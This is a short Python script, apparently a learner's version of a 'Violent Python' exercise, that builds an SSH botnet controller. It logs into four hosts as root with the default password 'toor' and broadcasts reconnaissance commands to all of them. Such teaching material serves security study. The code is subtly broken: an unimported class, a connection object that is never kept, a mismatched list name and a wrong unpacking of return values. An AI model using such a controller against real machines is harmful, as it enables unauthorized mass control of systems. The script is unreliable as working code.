#!/usr/bin/python
import optparse
import paramiko

# Violent Python. Chapter 2
# Botnet client, but I'm using paramiko, of course, 

class Client:
  def __init__(self, host, user, passwd):
    self.host = host
    self.user = user
    self.passwd = passwd
    client = SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(host, username=self.user, password=self.passwd)
  def send_command(self, cmd):
    stdin, stdout, stderr = client.exec_command(cmd)
    return stdout

def botnet_command(cmd):
  for client in botnet:
    stdin, stdout, stderr = client.send_command(cmd)
    print '[*] Output from %s' %(client.host)
    print '  [+] %s' %(stdout)

def add_client(host, user, passwd):
  client = Client(host, user, passwd)
  botNet.append(client)

botNet = []
add_client('10.10.10.100', 'root', 'toor')
add_client('10.10.10.110', 'root', 'toor')
add_client('10.10.10.120', 'root', 'toor')
add_client('10.10.10.130', 'root', 'toor')
botnet_command('uname -v')
botnet_command('cat /etc/issue')

